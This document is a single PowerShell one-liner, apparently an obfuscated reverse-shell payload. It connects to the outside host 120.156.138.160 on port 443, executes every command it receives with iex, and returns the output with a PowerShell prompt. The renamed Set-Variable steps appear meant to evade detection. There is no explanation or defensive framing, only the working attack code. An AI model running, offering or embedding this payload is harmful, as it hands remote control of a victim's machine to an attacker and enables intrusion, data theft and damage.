Set-Variable -Name c -Value (New-Object System.Net.Sockets.TCPClient("120.156.138.160",443));Set-Variable -Name s -Value ($c.GetStream());[byte[]]$b = 0..65535|%{0};while((Set-Variable -Name i -Value ($s.Read($b, 0, $b.Length))) -ne 0){;Set-Variable -Name d -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i));Set-Variable -Name sb1 -Value (iex $d 2>&1 | 
Out-String );Set-Variable -Name sb2 -Value ($sb1 + "PS " + (pwd).Path + "> ");Set-Variable -Name sb -Value (([text.encoding]::ASCII).GetBytes($sb2));$s.Write($sb,0,$sb.Length);$s.Flush()};$c.
Close()
